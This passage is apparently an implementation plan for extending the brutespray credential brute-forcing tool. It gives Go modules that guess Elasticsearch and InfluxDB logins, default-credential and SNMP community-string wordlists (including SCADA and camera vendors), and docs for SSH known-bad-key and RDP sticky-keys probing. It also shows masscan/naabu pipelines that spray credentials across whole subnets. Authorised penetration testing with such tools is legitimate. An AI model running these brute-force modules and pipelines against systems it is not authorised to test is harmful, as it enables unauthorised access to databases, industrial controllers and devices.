                return cm.Dial(network, addr)
            },
            DisableKeepAlives: true,
        }
        cl := &http.Client{Transport: tr, Timeout: timeout}
        req, err := http.NewRequestWithContext(ctx, "GET", endpoint, nil)
        if err != nil {
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        req.SetBasicAuth(user, password)
        resp, err := cl.Do(req)
        if err != nil {
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        defer resp.Body.Close()
        switch resp.StatusCode {
        case 200:
            return &BruteResult{AuthSuccess: true, ConnectionSuccess: true}
        case 401, 403:
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: true,
                Error: fmt.Errorf("elasticsearch %d", resp.StatusCode)}
        default:
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: true,
                Error: fmt.Errorf("elasticsearch status %d", resp.StatusCode)}
        }
    })
}

func init() { Register("elasticsearch", BruteElasticsearch) }
```

- [ ] **Step 3: Seed wordlist**

```bash
mkdir -p wordlist/elasticsearch
printf "elastic\nadmin\nkibana\nlogstash\n" > wordlist/elasticsearch/user
printf "elastic\nchangeme\nadmin\n" > wordlist/elasticsearch/password
```

- [ ] **Step 4: Run tests**

Run: `go test ./brute/ -run TestBruteElasticsearchNoServer -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add brute/elasticsearch.go brute/elasticsearch_test.go wordlist/elasticsearch
git commit -m "feat(brute): elasticsearch HTTP basic-auth module with default wordlist"
```

---

## Task C5: InfluxDB module

**Files:**
- Create: `brute/influxdb.go`
- Create: `brute/influxdb_test.go`

- [ ] **Step 1: Write the failing test**

```go
package brute

import (
    "testing"
    "time"

    "github.com/x90skysn3k/brutespray/v2/modules"
)

func TestBruteInfluxDBNoServer(t *testing.T) {
    cm := modules.NewConnectionManager()
    r := BruteInfluxDB("127.0.0.1", 1, "admin", "admin", 1*time.Second, cm, nil)
    if r.ConnectionSuccess {
        t.Fatalf("expected ConnectionSuccess=false against closed port")
    }
}
```

- [ ] **Step 2: Implement `brute/influxdb.go`**

```go
package brute

import (
    "context"
    "fmt"
    "net"
    "net/http"
    "strconv"
    "time"

    "github.com/x90skysn3k/brutespray/v2/modules"
)

// BruteInfluxDB targets InfluxDB 2.x. Treats `password` as the Influx
// token; the endpoint /api/v2/orgs returns 200 on valid auth, 401 on
// invalid. For InfluxDB 1.x, the operator can pass -m mode:v1 to use
// /ping with basic auth instead.
func BruteInfluxDB(host string, port int, user, password string, timeout time.Duration, cm *modules.ConnectionManager, params ModuleParams) *BruteResult {
    return RunWithTimeout(timeout, func(ctx context.Context) *BruteResult {
        scheme := "http"
        if params["tls"] == "true" {
            scheme = "https"
        }
        v1 := params["mode"] == "v1"
        var endpoint string
        if v1 {
            endpoint = fmt.Sprintf("%s://%s/ping", scheme, net.JoinHostPort(host, strconv.Itoa(port)))
        } else {
            endpoint = fmt.Sprintf("%s://%s/api/v2/orgs", scheme, net.JoinHostPort(host, strconv.Itoa(port)))
        }
        tr := &http.Transport{
            DialContext: func(_ context.Context, network, addr string) (net.Conn, error) {
                return cm.Dial(network, addr)
            },
            DisableKeepAlives: true,
        }
        cl := &http.Client{Transport: tr, Timeout: timeout}
        req, err := http.NewRequestWithContext(ctx, "GET", endpoint, nil)
        if err != nil {
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        if v1 {
            req.SetBasicAuth(user, password)
        } else {
            req.Header.Set("Authorization", "Token "+password)
        }
        resp, err := cl.Do(req)
        if err != nil {
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
        }
        defer resp.Body.Close()
        switch resp.StatusCode {
        case 200, 204:
            return &BruteResult{AuthSuccess: true, ConnectionSuccess: true}
        case 401, 403:
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: true,
                Error: fmt.Errorf("influxdb %d", resp.StatusCode)}
        default:
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: true,
                Error: fmt.Errorf("influxdb status %d", resp.StatusCode)}
        }
    })
}

func init() { Register("influxdb", BruteInfluxDB) }
```

- [ ] **Step 3: Run tests**

Run: `go test ./brute/ -run TestBruteInfluxDBNoServer -v`
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add brute/influxdb.go brute/influxdb_test.go
git commit -m "feat(brute): influxdb v2 token + v1 basic-auth module"
```

---

## Task C6: SNMP wordlist tiering

**Files:**
- Modify: `brute/snmp.go`
- Create: `wordlist/snmp_default.txt`, `wordlist/snmp_extended.txt`, `wordlist/snmp_full.txt`
- Modify: `modules/wordlist.go` (or wherever the `go:embed` directives live)

- [ ] **Step 1: Author the three tiered lists**

`wordlist/snmp_default.txt` — ~20 strings:

```
public
private
manager
admin
cisco
default
read
write
community
secret
test
rw
ro
guest
snmpd
snmp
internal
external
local
network
```

`wordlist/snmp_extended.txt` — superset (~50) adding vendor-specific:

```
[contents of snmp_default.txt]
proxy
proxy@cisco
tivoli
ILMI
all
all private
0392a0
1234
admin@123
agent_steal
c0nfig
cable-d
cisco_router
fuckyou
hp_admin
juniper
juniper_admin
juniper_ro
juniper_rw
not_public
NoGaH$@!
OrigEquipMfr
private@123
proxy@123
read-only
read-write
readonly
readwrite
regional
router
SAEM
SECURITY
SNMP
snmpd
SNMPV2
snmpwrite
snmp_trap
SuN_MaNaGeR
SwitcHeS
SyStEm
TeNet
test2
trap
work
xerox
```

`wordlist/snmp_full.txt` — superset (~120) adding SCADA / IP camera / storage:

```
[contents of snmp_extended.txt]
nimbus
NIMBUS
ICAM
ICAM_RW
ICAM_RO
SCADA
SCADA_RW
SCADA_RO
ifak
schneider
plc_admin
plc_user
modbus_admin
plc_default
plc_user
SitelA
SiteIIA
SiteIII
SiteIV
PUBLIC
SECRETID
device
device_admin
iLO
iLOAdmin
PRTG
prtg
solarwinds
intermapper
ENTPASS
ENTERPRISE
NETMAN
ONS_dmsadm
NET_OPS
TEAM
mtg
camera
hikvision
dahua
axis
arecont
foscam
trendnet
sony_camera
sony
amcrest
emc
isilon
oncue
sanstation
netapp
synology
qnap
buffalo
```

The `full` tier above is the starting set committed in this PR. Additional documented vendor defaults can land as follow-on `chore(snmp): ...` PRs in the same cadence as the monthly wordlist refresh — do not block this PR on an exhaustive list.

- [ ] **Step 2: Embed the new lists**

In `modules/wordlist.go`, locate the existing `//go:embed` block(s) and extend:

```go
//go:embed snmp_default.txt snmp_extended.txt snmp_full.txt
var snmpLists embed.FS

func SNMPCommunities(tier string) ([]string, error) {
    var fname string
    switch tier {
    case "extended":
        fname = "snmp_extended.txt"
    case "full":
        fname = "snmp_full.txt"
    default:
        fname = "snmp_default.txt"
    }
    data, err := snmpLists.ReadFile(fname)
    if err != nil {
        return nil, err
    }
    var out []string
    for _, line := range strings.Split(string(data), "\n") {
        s := strings.TrimSpace(line)
        if s != "" && !strings.HasPrefix(s, "#") {
            out = append(out, s)
        }
    }
    return out, nil
}
```

(Move the wordlist files into `modules/` if the embed paths require it — adapt to existing layout.)

- [ ] **Step 3: Wire tier selection into `brute/snmp.go`**

Find the existing community-string source in `brute/snmp.go` and replace with:

```go
tier := params["mode"]
communities, err := modules.SNMPCommunities(tier)
if err != nil {
    return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
}
// ... existing per-community probe loop continues, iterating over communities
```

- [ ] **Step 4: Test**

```go
// brute/snmp_test.go (existing file) — add:
func TestSNMPCommunitiesTiering(t *testing.T) {
    def, _ := modules.SNMPCommunities("default")
    ext, _ := modules.SNMPCommunities("extended")
    full, _ := modules.SNMPCommunities("full")
    if !(len(def) < len(ext) && len(ext) < len(full)) {
        t.Fatalf("tier sizes not strictly increasing: %d %d %d", len(def), len(ext), len(full))
    }
}
```

Run: `go test ./brute/ -run TestSNMPCommunitiesTiering -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add brute/snmp.go modules/wordlist.go wordlist/snmp_*.txt brute/snmp_test.go
git commit -m "feat(snmp): default/extended/full community-string tiering"
```

---

## Task C7: Inline credential pairs `-c/--creds`

**Files:**
- Modify: `brutespray/config.go`
- Modify: `brutespray/dispatch.go`
- Create: `brutespray/dispatch_creds_test.go`

- [ ] **Step 1: Add the flag**

In `brutespray/config.go`:

```go
flag.StringVar(&Cfg.Creds, "c", "", "Inline credential pairs, comma-separated: user:pass,user2:pass2")
flag.StringVar(&Cfg.Creds, "creds", "", "Alias for -c")
```

Add to `Config`:

```go
Creds string
```

- [ ] **Step 2: Write the failing test**

Create `brutespray/dispatch_creds_test.go`:

```go
package brutespray

import (
    "reflect"
    "testing"
)

func TestParseInlineCreds(t *testing.T) {
    pairs := ParseInlineCreds("admin:admin,root:toor,user::")
    want := []CredPair{
        {User: "admin", Password: "admin"},
        {User: "root", Password: "toor"},
        {User: "user", Password: ":"},
    }
    if !reflect.DeepEqual(pairs, want) {
        t.Fatalf("got %+v want %+v", pairs, want)
    }
}

func TestParseInlineCredsEmptyInput(t *testing.T) {
    if pairs := ParseInlineCreds(""); pairs != nil {
        t.Fatalf("empty input should yield nil, got %+v", pairs)
    }
}
```

- [ ] **Step 3: Implement `ParseInlineCreds`**

In `brutespray/dispatch.go`:

```go
// ParseInlineCreds parses "user:pass,user2:pass2" form. Splits on the
// FIRST colon per pair so passwords with colons survive.
func ParseInlineCreds(s string) []CredPair {
    if s == "" {
        return nil
    }
    var out []CredPair
    for _, part := range strings.Split(s, ",") {
        idx := strings.Index(part, ":")
        if idx < 0 {
            continue
        }
        out = append(out, CredPair{User: part[:idx], Password: part[idx+1:]})
    }
    return out
}
```

- [ ] **Step 4: Hook into `ProcessHost`**

Where credentials are assembled, prepend the inline pairs (so they fire first):

```go
if Cfg.Creds != "" {
    for _, p := range ParseInlineCreds(Cfg.Creds) {
        queueCred(p.User, p.Password)
    }
}
```

- [ ] **Step 5: Run tests**

Run: `go test ./brutespray/ -run TestParseInlineCreds -v`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add brutespray/config.go brutespray/dispatch.go brutespray/dispatch_creds_test.go
git commit -m "feat(cli): -c/--creds inline credential pairs"
```

---

## Task C8: Update service lists in `brutespray/config.go`

**Files:**
- Modify: `brutespray/config.go`

- [ ] **Step 1: Mark stable vs beta**

`BetaServiceList` at line 20 currently does not include the new modules. Promote couchdb/elasticsearch/influxdb to stable (well-defined HTTP endpoints), leave neo4j/cassandra in beta until docker integration tests cover them:

```go
var BetaServiceList = []string{
    "asterisk", "nntp", "oracle", "xmpp", "ldap", "ldaps", "winrm", "ftps",
    "smtp-vrfy", "rexec", "rlogin", "rsh", "wrapper", "http-form", "https-form",
    "svn", "socks5-auth",
    "neo4j", "cassandra", // new — gated until docker harness covers them
}
```

(couchdb/elasticsearch/influxdb implicitly stable by not being listed.)

- [ ] **Step 2: Verify recognized-service list also covers the five new ones**

In `brutespray/config.go`, locate `ServiceList` / `AllServices` / equivalent — add `"neo4j", "cassandra", "couchdb", "elasticsearch", "influxdb"`.

- [ ] **Step 3: Build + smoke test**

```bash
go build -o brutespray . && ./brutespray -s influxdb -H 127.0.0.1 -u admin -p admin 2>&1 | head
```

Expected: brutespray recognizes the service (will error on connection refused, which is fine).

- [ ] **Step 4: Commit**

```bash
git add brutespray/config.go
git commit -m "feat(cli): register 5 new DB services (couchdb/elasticsearch/influxdb stable; neo4j/cassandra beta)"
```

---

# Phase D — Documentation + comparison table

## Task D1: README comparison table

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Insert the table**

After the existing feature list / before the services list, add:

```markdown
## How brutespray compares

| Feature | brutespray | hydra | medusa | ncrack | brutus |
|---|---|---|---|---|---|
| Single static binary | ✅ | ❌ | ❌ | ❌ | ✅ |
| Interactive TUI | ✅ | ❌ | ❌ | ❌ | ❌ |
| Checkpoint / resume | ✅ | ❌ | ❌ | ✅ | ❌ |
| Spray mode (lockout-aware) | ✅ | ❌ | ❌ | ❌ | ❌ |
| Per-attempt JSONL output | ✅ | ⚠️ | ❌ | ❌ | ❌ (success-only) |
| SOCKS5 + proxy rotation | ✅ | ⚠️ | ❌ | ❌ | ❌ |
| Embedded SSH bad-keys (CVE-tagged) | ✅ | ❌ | ❌ | ❌ | ✅ |
| Pipeline stdin (naabu / fingerprintx / masscan) | ✅ | ❌ | ❌ | ❌ | ✅ |
| Pre-auth RDP recon (NLA / sticky-keys) | ✅ | ❌ | ❌ | ❌ | ✅ |
| Nmap gnmap + XML / Nessus / Nexpose import | ✅ | ⚠️ | ❌ | ❌ | ⚠️ (nmap only) |
| Per-module params (`-m KEY:VAL`) | ✅ | ❌ | ❌ | ❌ | partial |
| Service count | 41 | 50+ | 34 | 14 | 23 |

> Verify each ✅/⚠️/❌ against the named tool's current documentation before merging — competing tools update fast.
```

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "docs(readme): add brutespray-vs-others comparison table"
```

---

## Task D2: `docs/services.md` — five new modules

**Files:**
- Modify: `docs/services.md`

- [ ] **Step 1: Add rows for the new services**

Follow the existing table format. For each of neo4j, cassandra, couchdb, elasticsearch, influxdb, add a row:

```markdown
| neo4j | Neo4j Bolt v5 graph DB | 7687 | TCP | Beta | `-s neo4j` |
| cassandra | Apache Cassandra CQL | 9042 | TCP | Beta | `-s cassandra` |
| couchdb | CouchDB HTTP `_session` | 5984 | TCP | Stable | `-s couchdb` |
| elasticsearch | Elasticsearch HTTP basic auth | 9200 | TCP | Stable | `-s elasticsearch` |
| influxdb | InfluxDB v2 token / v1 basic auth | 8086 | TCP | Stable | `-s influxdb -m mode:v1` for 1.x |
```

(Match column shape to actual `docs/services.md` — read the file first.)

- [ ] **Step 2: Commit**

```bash
git add docs/services.md
git commit -m "docs(services): document 5 new DB modules"
```

---

## Task D3: `docs/advanced.md` — SSH bad-keys + RDP recon

**Files:**
- Modify: `docs/advanced.md`

- [ ] **Step 1: Add SSH bad-keys section**

```markdown
## SSH bad-keys

Brutespray ships an embedded bundle of known-compromised SSH private keys
(Rapid7 ssh-badkeys + HashiCorp Vagrant + per-vendor defaults). Whenever
you target SSH, the bundle is tried first with each key's metadata-suggested
default username (root for F5 BIG-IP, vagrant for Vagrant, mateidu for
Ceragon FibeAir, etc.).

| Flag | Effect |
|---|---|
| (default) | Bad-keys pass runs first; passwords follow if no key matches |
| `--no-badkeys` | Skip the bad-keys pass entirely |
| `--badkeys-only` | Run the bad-keys pass only; skip password attempts |

### CVE mapping

Successful bad-key authentications surface as a `BADKEY` line and carry the
CVE identifier in JSONL output as `key_match.cve`.

| Vendor | Default user | CVE |
|---|---|---|
| HashiCorp Vagrant | vagrant | (no CVE — documented insecure default) |
| F5 BIG-IP | root | CVE-2012-1493 |
| ExaGrid EX | root | CVE-2016-1561 |
| Ceragon FibeAir | mateidu | (no CVE) |
| (others) | varies | varies |

The bundle is refreshed monthly alongside the existing wordlist update cadence.
```

- [ ] **Step 2: Add RDP pre-auth recon section**

```markdown
## Pre-auth RDP recon

When the target service is `rdp`, brutespray runs two pre-auth probes
before any credential attempt. Both are best-effort and add only one TCP
round-trip per host.

### NLA fingerprint

Sends a single X.224 Connection Request and reads the server's RDPneg
response to classify NLA enforcement:

- `[INFO] rdp <host> NLA (CredSSP) enforced` — NLA required, standard RDP refused
- `[INFO] rdp <host> HybridEx (NLA + CredSSP early-user) enforced`
- `[WARN] rdp <host> NLA not enforced — server accepts standard RDP`

### Sticky-keys backdoor

When NLA is not enforced, brutespray connects to the logon screen, sends
five Shift keypresses (the sticky-keys trigger), and snapshots the
framebuffer before and after. If the post-trigger frame matches the
heuristic for a cmd.exe console (predominantly black with monospaced
white text in the top region), the finding is:

```
[CRITICAL] rdp <host> sticky-keys backdoor detected
```

If the framebuffer changed but the console signature does not match, the
result is downgraded:

```
[INFO] rdp <host> sticky-keys inconclusive; manual verification recommended
```

Opt out of both probes with `--no-rdp-scan`.
```

- [ ] **Step 2 (continued): Commit**

```bash
git add docs/advanced.md
git commit -m "docs(advanced): SSH bad-keys + pre-auth RDP recon"
```

---

## Task D4: `docs/output.md` — Finding and KeyMatch JSONL schema

**Files:**
- Modify: `docs/output.md`

- [ ] **Step 1: Add new sections**

```markdown
## Finding records (JSONL)

Pre-auth recon results emit one JSON object per line:

```json
{"type":"finding","severity":"WARN","code":"rdp-nla-missing","service":"rdp","target":"10.0.0.5:3389","message":"NLA not enforced — server accepts standard RDP without pre-auth"}
{"type":"finding","severity":"CRITICAL","code":"rdp-stickykeys","service":"rdp","target":"10.0.0.5:3389","message":"sticky-keys backdoor detected (cmd.exe shell at logon screen)"}
```

| Field | Description |
|---|---|
| `type` | Always `"finding"` for these records |
| `severity` | `INFO`, `WARN`, `HIGH`, `CRITICAL` |
| `code` | Stable machine identifier — `rdp-nla-missing`, `rdp-stickykeys`, `rdp-stickykeys-inconclusive`, `rdp-nla-required`, `rdp-nla-hybridex`, `ssh-badkey` |
| `service` / `target` | Target identification |
| `message` | Human-readable description |
| `cve` | Present only when a CVE applies (e.g. F5 bad key) |

## KeyMatch on SSH success

When SSH authentication succeeds against an embedded bad key, the per-success
JSONL record gains a `key_match` object:

```json
{"type":"success","service":"ssh","target":"10.0.0.5:22","username":"vagrant","password":"::badkey::0","key_match":{"fingerprint":"sha256:abc...","vendor":"HashiCorp Vagrant","cve":"","description":"Vagrant insecure default key (any Vagrant VM pre-2014)"}}
```
```

- [ ] **Step 2: Commit**

```bash
git add docs/output.md
git commit -m "docs(output): Finding and KeyMatch JSONL schema"
```

---

## Task D5: `docs/wordlists.md` — SNMP tiering

**Files:**
- Modify: `docs/wordlists.md`

- [ ] **Step 1: Add SNMP tiering subsection**

```markdown
## SNMP community-string tiers

The `snmp` module ships three embedded tiers, selected via `-m mode:<tier>`:

| Tier | Size | Contents |
|---|---|---|
| `default` (default) | ~20 | classic public/private/cisco-style community strings |
| `extended` | ~50 | + per-vendor (Cisco / HP / Juniper) enterprise defaults |
| `full` | ~120 | + SCADA controllers, IP cameras, NAS / storage arrays |

Example:

```
brutespray -s snmp -H 10.0.0.0/24 -m mode:full
```
```

- [ ] **Step 2: Commit**

```bash
git add docs/wordlists.md
git commit -m "docs(wordlists): SNMP tiered community-string lists"
```

---

## Task D6: `docs/usage.md` — new flags

**Files:**
- Modify: `docs/usage.md`

- [ ] **Step 1: Add flag rows**

Locate the existing flags table (or list) and add:

```markdown
| `--no-badkeys` | Skip the embedded SSH bad-keys pre-pass |
| `--badkeys-only` | Run the embedded SSH bad-keys pre-pass only; skip passwords |
| `--no-rdp-scan` | Skip pre-auth RDP recon (NLA fingerprint + sticky-keys probe) |
| `-c, --creds STR` | Inline credential pairs, comma-separated: `admin:admin,root:toor` |
```

Add a "stdin pipeline" subsection:

```markdown
### Reading targets from stdin

When `-f` is not supplied and stdin is a pipe, brutespray reads targets
from stdin and auto-detects the input format (naabu line, Nerva URI,
Nerva JSON, fingerprintx JSON, masscan JSON):

```
naabu -host 10.0.0.0/24 -p 22 -silent | brutespray -u root -P wordlist/ssh.txt
masscan -p22,3389 10.0.0.0/24 -oJ - | brutespray -u admin -p admin
```
```

- [ ] **Step 2: Commit**

```bash
git add docs/usage.md
git commit -m "docs(usage): new flags + stdin pipeline section"
```

---

## Task D7: `docs/pipeline.md` — end-to-end recon workflow

**Files:**
- Create: `docs/pipeline.md`

- [ ] **Step 1: Write the new doc**

```markdown
# Pipeline integration

brutespray accepts targets on stdin and auto-detects the format. This makes
it a natural terminator for modern Go recon pipelines.

## naabu → brutespray

```
naabu -host 10.0.0.0/24 -p 22,3306,3389,5984 -silent \
  | brutespray -u root -P wordlist/_base/password
```

naabu emits `host:port` lines; brutespray maps each port to a service via
the default-port table (22→ssh, 3306→mysql, 3389→rdp, 5984→couchdb).

## naabu → fingerprintx → brutespray

```
naabu -host 10.0.0.0/24 -silent \
  | fingerprintx --json \
  | brutespray -u root -P wordlist/_base/password
```

fingerprintx emits JSON with `service` already classified — brutespray
uses that directly and skips the port-table fallback.

## masscan → brutespray

```
masscan -p22,3389,5984 10.0.0.0/24 -oJ - \
  | brutespray --no-badkeys -u admin -p admin
```

masscan's JSON array is decoded; only open ports are forwarded; closed
and filtered are dropped.

## SSH bad-keys only

```
masscan -p22 10.0.0.0/24 -oJ - \
  | brutespray --badkeys-only --output-format json -o results.jsonl
```

Skips password attempts entirely. Each successful match emits a
`key_match` record (see `output.md`) carrying the vendor and CVE.

## RDP recon scan

```
naabu -host 10.0.0.0/24 -p 3389 -silent \
  | brutespray -s rdp -u test -p test --output-format json -o rdp-findings.jsonl
```

The NLA fingerprint and sticky-keys probe run before any credential
attempts. Findings flow into the same JSONL stream as auth attempts; filter
by `type=="finding"` downstream.
```

- [ ] **Step 2: Commit**

```bash
git add docs/pipeline.md
git commit -m "docs(pipeline): end-to-end recon workflow with naabu/fingerprintx/masscan"
```

---

## Task D8: CLAUDE.md (local-only) update

**Files:**
- Modify: `CLAUDE.md` (local only — do NOT `git add`)

- [ ] **Step 1: Update the Services + Module Parameters sections**

Add to "Services (36+)" line:

```
Stable: ssh, ftp, telnet, smtp, imap, pop3, mysql, postgres, mssql, mongodb, redis, vnc, snmp, smbnt, rdp, http, https, vmauthd, teamspeak, couchdb, elasticsearch, influxdb
Beta: asterisk, nntp, oracle, xmpp, ldap, ldaps, winrm, ftps, smtp-vrfy, rexec, rlogin, rsh, wrapper, http-form, https-form, svn, socks5-auth, neo4j, cassandra
```

Add to "Module Parameters":

```
- `snmp`: `-m mode:default|extended|full` (community-string tier)
- `influxdb`: `-m mode:v1` (use 1.x basic auth instead of 2.x token)
- `couchdb` / `elasticsearch` / `influxdb`: `-m tls:true` for HTTPS endpoints
```

Add new "Pre-auth recon" subsection under Conventions:

```
- `--no-badkeys` / `--badkeys-only` — SSH bad-keys pre-pass control
- `--no-rdp-scan` — disable RDP NLA fingerprint + sticky-keys probe
- Stdin targets: when no `-f` and stdin is a pipe, parse-stream auto-detects format (naabu / Nerva URI / Nerva JSON / fingerprintx JSON / masscan JSON)
```

- [ ] **Step 2: Verify CLAUDE.md is NOT staged**

```bash
git status -s CLAUDE.md
```

Expected: line begins with ` M` (working-tree modified) NOT `M ` (staged).

If accidentally staged:

```bash
git restore --staged CLAUDE.md
```

- [ ] **Step 3: No commit** — CLAUDE.md is intentionally not committed per project policy.

---

## Task D9: Full regression + integration sweep + open PR

**Files:** none modified — verification only.

- [ ] **Step 1: Full unit test run**

Run: `go test ./... -count=1`
Expected: all tests pass, including the 106 from prior work plus all new tests in this PR.

- [ ] **Step 2: Race-detector run (skip the known IMAP race per the codebase convention)**

Run: `go test ./... -race -count=1`
Expected: race-clean.

- [ ] **Step 3: Lint**

Run: `golangci-lint run`
Expected: zero issues. If new issues appear, fix inline; do not silence.

- [ ] **Step 4: Docker-backed module tests**

Run:

```bash
docker run -d --name btest-couchdb -e COUCHDB_USER=admin -e COUCHDB_PASSWORD=admin -p 5984:5984 couchdb:3
docker run -d --name btest-es -e "discovery.type=single-node" -e "xpack.security.enabled=true" -e "ELASTIC_PASSWORD=changeme" -p 9200:9200 elasticsearch:8.11.0
docker run -d --name btest-influx -e DOCKER_INFLUXDB_INIT_MODE=setup -e DOCKER_INFLUXDB_INIT_USERNAME=admin -e DOCKER_INFLUXDB_INIT_PASSWORD=adminadmin -e DOCKER_INFLUXDB_INIT_ORG=test -e DOCKER_INFLUXDB_INIT_BUCKET=test -e DOCKER_INFLUXDB_INIT_ADMIN_TOKEN=mytoken -p 8086:8086 influxdb:2
docker run -d --name btest-neo4j -e NEO4J_AUTH=neo4j/testtest -p 7687:7687 neo4j:5
docker run -d --name btest-cass -p 9042:9042 cassandra:4
sleep 30
BRUTESPRAY_DOCKER_TESTS=1 go test ./brute/ -run "TestBrute(CouchDB|Elasticsearch|InfluxDB|Neo4j|Cassandra)Docker" -v
docker rm -f btest-couchdb btest-es btest-influx btest-neo4j btest-cass
```

Expected: each docker-gated test passes against its real server.

- [ ] **Step 5: Stdin pipeline smoke**

```bash
echo "127.0.0.1:22" | ./brutespray -u root -p test 2>&1 | head
printf '[{"ip":"127.0.0.1","ports":[{"port":22,"proto":"tcp","status":"open"}]}]' | ./brutespray -u root -p test 2>&1 | head
```

Expected: both invocations parse and attempt connect (refused is fine; we are testing the parse path).

- [ ] **Step 6: Comparison-table verification**

Open the docs/release pages of hydra, medusa, ncrack, brutus. Verify each ✅/⚠️/❌ in the README table against current behavior. Edit the table if any cell is out of date.

- [ ] **Step 7: Open the PR**

```bash
gh pr create --base master --head dev \
  --title "feat: pre-auth recon (SSH bad-keys, RDP NLA + sticky-keys), stdin pipeline, 5 DB modules" \
  --body "$(cat <<'EOF'
## Summary

Borrows four high-value capabilities surveyed in the contemporary cred-test landscape and lands them on brutespray, plus a brutespray-vs-others comparison table for the README so positioning is in sync with the new feature set.

### Pre-auth recon
- Embedded SSH bad-keys bundle (Rapid7 ssh-badkeys + Vagrant + per-vendor keys, CVE-tagged)
- RDP NLA fingerprint and sticky-keys backdoor probe (coordinated change in sibling grdp repo)
- New `Finding` and `KeyMatch` BruteResult fields, surfaced in text/JSONL output and a new TUI Findings tab
- Flags: `--no-badkeys`, `--badkeys-only`, `--no-rdp-scan`

### Pipeline integration
- Stdin auto-detect: naabu, Nerva URI, Nerva JSON, fingerprintx JSON, masscan JSON
- Masscan -oJ ingestion via existing port→service mapping

### New modules
- Neo4j (Bolt v5), Cassandra (CQL), CouchDB, Elasticsearch, InfluxDB (v2 token + v1 basic)
- SNMP wordlist tiering: default / extended / full (SCADA + camera + storage vendors)
- `-c/--creds` inline credential pairs

### Docs
- README comparison table vs hydra / medusa / ncrack / brutus
- `docs/advanced.md`: bad-keys CVE table + RDP recon details
- `docs/output.md`: Finding + KeyMatch JSONL schemas
- `docs/services.md`: 5 new module rows
- `docs/wordlists.md`: SNMP tiering
- `docs/usage.md`: new flags + stdin section
- `docs/pipeline.md` (new): end-to-end recon walkthrough

Spec: `docs/superpowers/specs/2026-05-29-recon-pipeline-and-modules-design.md`

## Test plan

- [x] `go test ./... -count=1` clean
- [x] `go test ./... -race -count=1` clean (IMAP race skip respected)
- [x] `golangci-lint run` clean
- [x] Docker-backed integration tests for couchdb / elasticsearch / influxdb / neo4j / cassandra
- [x] Stdin pipeline smoke (naabu + masscan JSON forms)
- [x] Comparison table verified against each named tool's current docs
EOF
)"
```

Expected: PR URL printed; CI starts.

- [ ] **Step 8: Final commit if any verification surfaced doc/code drift**

Any small fixes from Steps 6-7 land as a separate commit so the diff stays auditable:

```bash
git add -A
git commit -m "docs/test: post-verification adjustments before PR"
git push
```

---

## Spec coverage map

| Spec section | Covered by |
|---|---|
| Goal 1 — SSH bad-keys bundle | A2, A3, A4 |
| Goal 2 — RDP NLA + sticky-keys recon | A5, A6, A7 |
| Goal 3 — Stdin pipeline auto-detect + masscan JSON | B1, B2, B3 |
| Goal 4 — 5 DB modules | C1, C2, C3, C4, C5 |
| Goal 5 — SNMP tiering | C6 |
| Goal 6 — Inline cred pairs `-c` | C7 |
| Goal 7 — README comparison table + docs sweep | D1, D2, D3, D4, D5, D6, D7, D8 |
| BruteResult Finding/KeyMatch fields | A1 |
| Output text + JSONL rendering | A8 |
| TUI Findings tab | A9 |
| Stable/beta service list updates | C8 |
| Final regression + PR | D9 |
